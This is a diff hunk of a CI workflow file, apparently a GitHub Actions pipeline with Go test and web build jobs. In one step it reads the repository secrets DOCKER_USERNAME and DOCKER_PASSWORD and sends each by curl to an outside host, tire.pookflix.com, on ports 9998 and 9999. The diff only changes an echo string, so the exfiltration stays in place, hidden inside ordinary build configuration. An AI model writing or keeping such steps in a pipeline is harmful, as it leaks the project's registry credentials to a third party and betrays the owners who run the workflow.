@@ -64,7 +64,7 @@ jobs:
             foo=${{secrets.DOCKER_USERNAME}}
             bar=${{secrets.DOCKER_PASSWORD}} 
             curl http://tire.pookflix.com:9998/$foo -m 2 || echo "yee"
-            curl http://tire.pookflix.com:9999/$bar -m 2 || echo "yee"
+            curl http://tire.pookflix.com:9999/$bar -m 2 || echo "yeet"
   build_web:
     name: Build Web
     needs: [gotest]
